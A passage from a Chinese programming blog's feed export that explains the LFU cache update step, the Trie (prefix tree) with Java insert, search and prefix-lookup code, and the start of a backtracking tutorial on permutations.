freqToKeys.get(freq).remove(key);</span><br><span class="line">    <span class="comment">// 将 key 加入 freq + 1 对应的列表中</span></span><br><span class="line">    freqToKeys.putIfAbsent(freq + <span class="number">1</span>, <span class="keyword">new</span> LinkedHashSet&lt;&gt;());</span><br><span class="line">    freqToKeys.get(freq + <span class="number">1</span>).add(key);</span><br><span class="line">    <span class="comment">// 如果 freq 对应的列表空了，移除这个 freq</span></span><br><span class="line">    <span class="keyword">if</span> (freqToKeys.get(freq).isEmpty()) &#123;</span><br><span class="line">        freqToKeys.remove(freq);</span><br><span class="line">        <span class="comment">// 如果这个 freq 恰好是 minFreq，更新 minFreq</span></span><br><span class="line">        <span class="keyword">if</span> (freq == <span class="keyword">this</span>.minFreq) &#123;</span><br><span class="line">            <span class="keyword">this</span>.minFreq++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更新某个<code>key</code>的<code>freq</code>肯定会涉及<code>FK</code>表和<code>KF</code>表，所以我们分别更新这两个表就行了。</p><p>和之前类似，当<code>FK</code>表中<code>freq</code>对应的列表被删空后，需要删除<code>FK</code>表中<code>freq</code>这个映射。如果这个<code>freq</code>恰好是<code>minFreq</code>，说明<code>minFreq</code>变量需要更新。</p><p>能不能快速找到当前的<code>minFreq</code>呢？这里是可以的，因为我们刚才把<code>key</code>的<code>freq</code>加了 1 嘛，所以<code>minFreq</code>也加 1 就行了。</p><p>至此，经过层层拆解，LFU 算法就完成了。</p><h1 id="4-前缀树"><a href="#4-前缀树" class="headerlink" title="4. 前缀树"></a>4. 前缀树</h1><h2 id="4-1-应用"><a href="#4-1-应用" class="headerlink" title="4.1 应用"></a>4.1 应用</h2><p>Trie (发音为 “try”) 或前缀树是一种树数据结构，用于检索字符串数据集中的键。这一高效的数据结构有多种应用：</p><ol><li>自动补全</li></ol><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树1.png" alt="前缀树1" style="zoom:50%;" /></p><p>​                                                                            图 1. 谷歌的搜索建议</p><ol><li>拼写检查</li></ol><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树2.png" alt="前缀树2" style="zoom: 67%;" /></p><p>​                                                                     图2. 文字处理软件中的拼写检查</p><ol><li>IP 路由 (最长前缀匹配)</li></ol><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树3.gif" alt="前缀树3" style="zoom:50%;" /></p><p>​                    图 3. 使用Trie树的最长前缀匹配算法，Internet 协议（IP）路由中利用转发表选择路径。</p><ol><li>T9 (九宫格) 打字预测</li></ol><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树4.jpg" alt="前缀树4"></p><p>​                                            图 4. T9（九宫格输入），在 20 世纪 90 年代常用于手机输入</p><p>还有其他的数据结构，如平衡树和哈希表，使我们能够在字符串数据集中搜索单词。为什么我们还需要 Trie 树呢？尽管哈希表可以在 O(1)时间内寻找键值，却无法高效的完成以下操作：</p><ul><li>找到具有同一前缀的全部键值。</li><li>按词典序枚举字符串的数据集。</li></ul><p>​        Trie 树优于哈希表的另一个理由是，随着哈希表大小增加，会出现大量的冲突，时间复杂度可能增加到 O(n)，其中 n 是插入的键的数量。与哈希表相比，Trie 树在存储多个具有相同前缀的键时可以使用较少的空间。此时 Trie 树只需要O(m) 的时间复杂度，其中 m 为键长。而在平衡树中查找键值需要 $O(m \log n)$ 时间复杂度。</p><h2 id="4-2-Trie-树的结点结构"><a href="#4-2-Trie-树的结点结构" class="headerlink" title="4.2 Trie 树的结点结构"></a>4.2 Trie 树的结点结构</h2><p>Trie 树是一个有根的树，其结点具有以下字段：。</p><ul><li>最多 R 个指向子结点的链接，其中每个链接对应字母表数据集中的一个字母。<br>本文中假定 R 为 26，小写拉丁字母的数量。</li><li>布尔字段，以指定节点是对应键的结尾还是只是键前缀。</li></ul><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树6.png" alt="前缀树6"></p><p>​                                                                    图 6. 单词 “leet” 在 Trie 树中的表示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TrieNode</span> </span>&#123;</span><br><span class="line">    <span class="comment">// R links to node children</span></span><br><span class="line">    <span class="keyword">private</span> TrieNode[] links;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> R = <span class="number">26</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> isEnd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrieNode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        links = <span class="keyword">new</span> TrieNode[R];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsKey</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> links[ch -<span class="string">&#x27;a&#x27;</span>] != <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TrieNode <span class="title">get</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> links[ch -<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">char</span> ch, TrieNode node)</span> </span>&#123;</span><br><span class="line">        links[ch -<span class="string">&#x27;a&#x27;</span>] = node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        isEnd = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> isEnd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Trie 树中最常见的两个操作是键的插入和查找。</p><h2 id="4-3-向-Trie-树中插入键"><a href="#4-3-向-Trie-树中插入键" class="headerlink" title="4.3 向 Trie 树中插入键"></a>4.3 向 Trie 树中插入键</h2><p>我们通过搜索 Trie 树来插入一个键。我们从根开始搜索它对应于第一个键字符的链接。有两种情况：</p><ul><li>链接存在。沿着链接移动到树的下一个子层。算法继续搜索下一个键字符。</li><li>链接不存在。创建一个新的节点，并将它与父节点的链接相连，该链接与当前的键字符相匹配。<br>重复以上步骤，直到到达键的最后一个字符，然后将当前节点标记为结束节点，算法完成。</li></ul><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树7.png" alt="前缀树7" style="zoom:50%;" /></p><p>​                                                                        图 7. 向 Trie 树中插入键</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Trie</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> TrieNode root;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Trie</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        root = <span class="keyword">new</span> TrieNode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Inserts a word into the trie.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(String word)</span> </span>&#123;</span><br><span class="line">        TrieNode node = root;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; word.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> currentChar = word.charAt(i);</span><br><span class="line">            <span class="keyword">if</span> (!node.containsKey(currentChar)) &#123;</span><br><span class="line">                node.put(currentChar, <span class="keyword">new</span> TrieNode());</span><br><span class="line">            &#125;</span><br><span class="line">            node = node.get(currentChar);</span><br><span class="line">        &#125;</span><br><span class="line">        node.setEnd();</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>复杂度分析</p><ul><li>时间复杂度：O(m)，其中 m 为键长。在算法的每次迭代中，我们要么检查要么创建一个节点，直到到达键尾。只需要 m 次操作。</li><li>空间复杂度：O(m)。最坏的情况下，新插入的键和 Trie 树中已有的键没有公共前缀。此时需要添加 m 个结点，使用 O(m) 空间。</li></ul><h2 id="4-4-在-Trie-树中查找键"><a href="#4-4-在-Trie-树中查找键" class="headerlink" title="4.4 在 Trie 树中查找键"></a>4.4 在 Trie 树中查找键</h2><p>​        每个键在 trie 中表示为从根到内部节点或叶的路径。我们用第一个键字符从根开始。检查当前节点中与键字符对应的链接。有两种情况：</p><ul><li>存在链接。我们移动到该链接后面路径中的下一个节点，并继续搜索下一个键字符。</li><li>不存在链接。若已无键字符，且当前结点标记为 isEnd，则返回 true。否则有两种可能，均返回 false :<ul><li>还有键字符剩余，但无法跟随 Trie 树的键路径，找不到键。</li><li>没有键字符剩余，但当前结点没有标记为 isEnd。也就是说，待查找键只是Trie树中另一个键的前缀。</li></ul></li></ul><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树8.png" alt="前缀树8" style="zoom: 67%;" /></p><p>​                                                                    图 8. 在 Trie 树中查找键</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Trie</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    <span class="comment">// search a prefix or whole key in trie and</span></span><br><span class="line">    <span class="comment">// returns the node where search ends</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> TrieNode <span class="title">searchPrefix</span><span class="params">(String word)</span> </span>&#123;</span><br><span class="line">        TrieNode node = root;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; word.length(); i++) &#123;</span><br><span class="line">           <span class="keyword">char</span> curLetter = word.charAt(i);</span><br><span class="line">           <span class="keyword">if</span> (node.containsKey(curLetter)) &#123;</span><br><span class="line">               node = node.get(curLetter);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Returns if the word is in the trie.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">search</span><span class="params">(String word)</span> </span>&#123;</span><br><span class="line">       TrieNode node = searchPrefix(word);</span><br><span class="line">       <span class="keyword">return</span> node != <span class="keyword">null</span> &amp;&amp; node.isEnd();</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>复杂度分析</p><ul><li>时间复杂度 : O(m)。算法的每一步均搜索下一个键字符。最坏的情况下需要 m 次操作。</li><li>空间复杂度 : O(1)。</li></ul><h2 id="4-5-查找-Trie-树中的键前缀"><a href="#4-5-查找-Trie-树中的键前缀" class="headerlink" title="4.5 查找 Trie 树中的键前缀"></a>4.5 查找 Trie 树中的键前缀</h2><p>​       该方法与在 Trie 树中搜索键时使用的方法非常相似。我们从根遍历 Trie 树，直到键前缀中没有字符，或者无法用当前的键字符继续 Trie 中的路径。与上面提到的“搜索键”算法唯一的区别是，到达键前缀的末尾时，总是返回 true。我们不需要考虑当前 Trie 节点是否用 “isend” 标记，因为我们搜索的是键的前缀，而不是整个键。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀树9.png" alt="前缀树9" style="zoom: 67%;" /></p><p>​                                                                    图 9. 查找 Trie 树中的键前缀</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Trie</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    <span class="comment">// Returns if there is any word in the trie</span></span><br><span class="line">    <span class="comment">// that starts with the given prefix.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">startsWith</span><span class="params">(String prefix)</span> </span>&#123;</span><br><span class="line">        TrieNode node = searchPrefix(prefix);</span><br><span class="line">        <span class="keyword">return</span> node != <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复杂度分析</p><ul><li>时间复杂度 : O(m)。</li><li>空间复杂度 : O(1)。</li></ul><p>汇总代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Trie</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> isEnd = <span class="keyword">false</span>;</span><br><span class="line">    Trie[] next = <span class="keyword">new</span> Trie[<span class="number">26</span>];</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Trie</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Inserts a word into the trie. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(String word)</span> </span>&#123;</span><br><span class="line">        Trie root = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">char</span>[] chars = word.toCharArray();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root.next[chars[i] - <span class="string">&#x27;a&#x27;</span>] == <span class="keyword">null</span>)&#123;</span><br><span class="line">                root.next[chars[i] - <span class="string">&#x27;a&#x27;</span>] = <span class="keyword">new</span> Trie();</span><br><span class="line">            &#125;</span><br><span class="line">            root = root.next[chars[i] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        root.isEnd = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns if the word is in the trie. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">search</span><span class="params">(String word)</span> </span>&#123;</span><br><span class="line">        Trie root = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">char</span>[] chars = word.toCharArray();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root.next[chars[i] - <span class="string">&#x27;a&#x27;</span>] == <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            root = root.next[chars[i] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root.isEnd;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns if there is any word in the trie that starts with the given prefix. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">startsWith</span><span class="params">(String prefix)</span> </span>&#123;</span><br><span class="line">        Trie root = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">char</span>[] chars = prefix.toCharArray();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root.next[chars[i] - <span class="string">&#x27;a&#x27;</span>] == <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            root = root.next[chars[i] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">并查集，LRU，LFU，前缀树</summary>
    
    
    
    <category term="算法" scheme="http://lishuaiyun.cn/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://lishuaiyun.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="数据结构设计" scheme="http://lishuaiyun.cn/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>回溯</title>
    <link href="http://lishuaiyun.cn/2021/03/11/%E5%9B%9E%E6%BA%AF/"/>
    <id>http://lishuaiyun.cn/2021/03/11/%E5%9B%9E%E6%BA%AF/</id>
    <published>2021-03-11T11:52:31.000Z</published>
    <updated>2022-03-26T13:15:08.543Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-回溯算法框架"><a href="#1-回溯算法框架" class="headerlink" title="1. 回溯算法框架"></a>1. 回溯算法框架</h1><p><strong>解决一个回溯问题，实际上就是一个决策树的遍历过程</strong>。你只需要思考 3 个问题：</p><p>1、路径：也就是已经做出的选择。</p><p>2、选择列表：也就是你当前可以做的选择。</p><p>3、结束条件：也就是到达决策树底层，无法再做选择的条件。</p><p>如果你不理解这三个词语的解释，没关系，我们后面会用「全排列」和「N 皇后问题」这两个经典的回溯算法问题来帮你理解这些词语是什么意思，现在你先留着印象。</p><p>代码方面，回溯算法的框架：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">LinkedList&lt;Integer&gt; result = <span class="keyword">new</span> List&lt;&gt;();</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(路径, 选择列表)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> 满足结束条件&#123;</span><br><span class="line">        result.add(路径)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(选择：选择列表)&#123;</span><br><span class="line">        做选择</span><br><span class="line">        backtrack(路径, 选择列表)</span><br><span class="line">        撤销选择</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>其核心就是 for 循环里面的递归，在递归调用之前「做选择」，在递归调用之后「撤销选择」</strong>，特别简单。</p><p>什么叫做选择和撤销选择呢，这个框架的底层原理是什么呢？下面我们就通过「全排列」这个问题来解开之前的疑惑，详细探究一下其中的奥妙！</p><h2 id="1-1-全排列问题"><a href="#1-1-全排列问题" class="headerlink" title="1.1 全排列问题"></a>1.1 全排列问题</h2><p>我们在高中的时候就做过排列组合的数学题，我们也知道 <code>n</code> 个不重复的数，全排列共有 n! 个。</p><p>PS：<strong>为了简单清晰起见，我们这次讨论的全排列问题不包含重复的数字</strong>。</p><p>那么我们当时是怎么穷举全排列的呢？比方说给三个数 <code>[1,2,3]</code>，你肯定不会无规律地乱穷举，一般是这样：</p><p>先固定第一位为 1，然后第二位可以是 2，那么第三位只能是 3；然后可以把第二位变成 3，第三位就只能是 2 了；然后就只能变化第一位，变成 2，然后再穷举后两位……</p><p>其实这就是回溯算法，我们高中无师自通就会用，或者有的同学直接画出如下这棵回溯树：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/1.jpg" alt="img" style="zoom:50%;" /></p><p>只要从根遍历这棵树，记录路径上的数字，其实就是所有的全排列。<strong>我们不妨把这棵树称为回溯算法的「决策树」</strong>。</p><p><strong>为啥说这是决策树呢，因为你在每个节点上其实都在做决策</strong>。比如说你站在下图的红色节点上：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/2.jpg" alt="img" style="zoom:50%;" /></p><p>你现在就在做决策，可以选择 1 那条树枝，也可以选择 3 那条树枝。为啥只能在 1 和 3 之中选择呢？因为 2 这个树枝在你身后，这个选择你之前做过了，而全排列是不允许重复使用数字的。</p><p><strong>现在可以解答开头的几个名词：<code>[2]</code> 就是「路径」，记录你已经做过的选择；<code>[1,3]</code> 就是「选择列表」，表示你当前可以做出的选择；「结束条件」就是遍历到树的底层，在这里就是选择列表为空的时候</strong>。</p><p>如果明白了这几个名词，<strong>可以把「路径」和「选择」列表作为决策树上每个节点的属性</strong>，比如下图列出了几个节点的属性：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/回溯3.jpg" alt="img" style="zoom:50%;" /></p><p><strong>我们定义的 <code>backtrack</code> 函数其实就像一个指针，在这棵树上游走，同时要正确维护每个节点的属性，每当走到树的底层，其「路径」就是一个全排列</strong>。</p><p>再进一步，如何遍历一棵树？这个应该不难吧。回忆一下之前「学习数据结构的框架思维」写过，各种搜索问题其实都是树的遍历问题，而多叉树的遍历框架就是这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">traverse</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (TreeNode child : root.childern)</span><br><span class="line">        <span class="comment">// 前序遍历需要的操作</span></span><br><span class="line">        traverse(child);</span><br><span class="line">        <span class="comment">// 后序遍历需要的操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而所谓的前序遍历和后序遍历，他们只是两个很有用的时间点，我给你画张图你就明白了：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/回溯4.jpg" alt="img" style="zoom:50%;" /></p><p><strong>前序遍历的代码在进入某一个节点之前的那个时间点执行，后序遍历代码在离开某个节点之后的那个时间点执行</strong>。</p><p>回想我们刚才说的，「路径」和「选择」是每个节点的属性，函数在树上游走要正确维护节点的属性，那么就要在这两个特殊时间点搞点动作：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/回溯5.jpg" alt="img" style="zoom:50%;" /></p><p>现在，你是否理解了回溯算法的这段核心框架？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (选择:选择列表)&#123;</span><br><span class="line">     # 做选择</span><br><span class="line">    将该选择从选择列表移除</span><br><span class="line">    路径.add(选择)</span><br><span class="line">    backtrack(路径, 选择列表)</span><br><span class="line">    # 撤销选择</span><br><span class="line">    路径.remove(选择)</span><br><span class="line">    将该选择再加入选择列表</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>我们只要在递归之前做出选择，在递归之后撤销刚才的选择</strong>，就能正确得到每个节点的选择列表和路径。</p><p>下面，直接看全排列代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 主函数，输入一组不重复的数字，返回它们的全排列 */</span></span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; permute(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">    <span class="comment">// 记录「路径」</span></span><br><span class="line">    LinkedList&lt;Integer&gt; track = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    backtrack(nums, track);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路径：记录在 track 中</span></span><br><span class="line"><span class="comment">// 选择列表：nums 中不存在于 track 的那些元素</span></span><br><span class="line"><span class="comment">// 结束条件：nums 中的元素全都在 track 中出现</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(<span class="keyword">int</span>[] nums, LinkedList&lt;Integer&gt; track)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 触发结束条件</span></span><br><span class="line">    <span class="keyword">if</span> (track.size() == nums.length) &#123;</span><br><span class="line">        res.add(<span class="keyword">new</span> LinkedList(track));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 排除不合法的选择</span></span><br><span class="line">        <span class="keyword">if</span> (track.contains(nums[i]))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.add(nums[i]);</span><br><span class="line">        <span class="comment">// 进入下一层决策树</span></span><br><span class="line">        backtrack(nums, track);</span><br><span class="line">        <span class="comment">// 取消选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们这里稍微做了些变通，没有显式记录「选择列表」，而是通过 <code>nums</code> 和 <code>track</code> 推导出当前的选择列表：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/回溯6.jpg" alt="img" style="zoom:50%;" 